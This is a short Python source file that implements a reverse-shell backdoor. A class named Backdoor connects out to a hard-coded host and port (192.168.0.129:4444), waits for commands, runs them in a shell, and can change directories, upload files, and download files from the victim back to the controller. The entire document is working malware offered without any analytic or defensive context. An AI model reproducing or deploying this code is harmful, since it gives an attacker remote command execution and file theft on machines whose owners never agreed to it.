import socket,subprocess,json,os
ip='192.168.0.129'
port=4444

class Backdoor:
    def __init__(self,ip,port):
        #create socket object
        self.connection=socket.socket()
        self.connection.connect((ip,port))
    def execute_command(self, command):
        try:
            return subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout.decode()
        except Exception as e:
            exception_message = str(e)
            return exception_message

    
        
    def change_directory(self,path):
        os.chdir(path)
        return f"changing working directory to {path}"
    
    def read_file(self,path):
        with open(path,'rb') as file:
           return file.read()
       
    def write_file(self,path,content):
        with open(path,'wb') as file:
            file.write(content.encode())     
            return "[*]Upload successful"
        
        
    def reliable_send(self,data):
        json_data=json.dumps(str(data))
        self.connection.send(json_data.encode())
    
    def reliable_receive(self):
        json_data=b''
        while True:
            try:
                json_data+=self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue
                
    def run(self):
     while True:
         
            command=self.reliable_receive()
            
            try:
                if command[0]=="exit":
                    self.connection.close()
                    exit()
                elif command[0]=='cd' and len(command)>1:
                    command_result=self.change_directory(command[1])
                elif command[0]=='download':
                    command_result=self.read_file(command[1])
                elif command[0]=='upload':
                    command_result=self.write_file(command[1],command[2])   
                    
                else:    
                    command_result=self.execute_command(command)
            except Exception:
                command_result= f"[-]Error while command execution"
            self.reliable_send(command_result)
       
my_backdoor= Backdoor('192.168.0.129',4444)  
my_backdoor.run()

